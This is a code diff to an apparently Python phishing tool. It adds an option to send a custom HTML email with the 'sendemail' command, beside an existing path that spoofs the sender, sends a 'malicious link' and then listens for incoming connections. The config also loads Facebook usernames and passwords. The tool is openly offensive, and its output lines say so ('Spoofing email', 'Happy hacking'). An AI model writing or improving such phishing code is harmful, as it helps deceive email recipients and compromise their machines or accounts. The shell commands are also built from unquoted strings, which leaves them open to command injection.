@@ -67,6 +67,8 @@ def setup ():
 	global smtpPort
 	global subject
 	global message
+	global isCustomHTML
+	global customHTML
 	global goodByeName
 	global fbusername
 	global fbpassword
@@ -87,6 +89,8 @@ def setup ():
 	goodByeName = configParser.get('Config', 'goodByeName')
 	subject = configParser.get('Config', 'subject')
 	message = configParser.get('Config', 'message')
+	isCustomHTML = configParser.get('Config', 'isCustomHTML')
+	customHTML = configParser.get('Config', 'customHTML')
 	fbuser = configParser.get('Config', 'fbuser')
 	fbusername = configParser.get('Config', 'fbusername')
 	fbpassword = configParser.get('Config', 'fbpassword')
@@ -194,25 +198,37 @@ def sendMail(server, toAddr, address, username, password, subject, message, good
 
 			# Get the link
 			link = getLink()
-			# Print out a thew important messages.
 			color_print("[+] Sending email to.. " + toAddr, color='blue')
 			time.sleep(2)
-			color_print("[+] Spoofing email.. " + address, color='blue')
+			if (enabledSpoofing == 'True'): color_print("[+] Spoofing email.. " + address, color='blue')
 			time.sleep(2)
 			color_print("[*] Sending malicious link..", color='yellow')
 			time.sleep(1)
+			
+			# Check if the user wants to load a custom html file
+			if (isCustomHTML == 'True'):
+			 	color_print("[+] Loading custom HTML Message", color='green')
+				CustomHTML = open(customHTML, 'r')
+				# Send the mail.
+				os.system("sendemail -f " + address + " -t " + toAddr + " -u " + subject + " -o message-content-type=html -o message-file=" + customHTML + " -xu " + username + " -xp " + password + " -s " + server)		
+				listenForConnections()
+			else:
 
-			MessageFile = open('message.html', 'w')
-			MessageFile.write("""
-"""+message+"""
-<br></br>
-<a href="""+link+""">"""+link+"""</a>
-<br>"""+goodBye+"""</br>
-</html>""")
-			MessageFile.close()
-			# Send the mail.
-			os.system("sendemail -f " + address + " -t " + toAddr + " -u " + subject + " -o message-content-type=html -o message-file=message.html " + " -xu " + username + " -xp " + password + " -s " + server)		
-			listenForConnections()
+
+				# Print out a thew important messages.
+				
+
+				MessageFile = open('message.html', 'w')
+				MessageFile.write("""
+	"""+message+"""
+	<br></br>
+	<a href="""+link+""">"""+link+"""</a>
+	<br>"""+goodBye+"""</br>
+	</html>""")
+				MessageFile.close()
+				# Send the mail.
+				os.system("sendemail -f " + address + " -t " + toAddr + " -u " + subject + " -o message-content-type=html -o message-file=message.html " + " -xu " + username + " -xp " + password + " -s " + server)		
+				listenForConnections()
 		except KeyboardInterrupt:
 			color_print("Thanks, Happy hacking", color='blue')
 
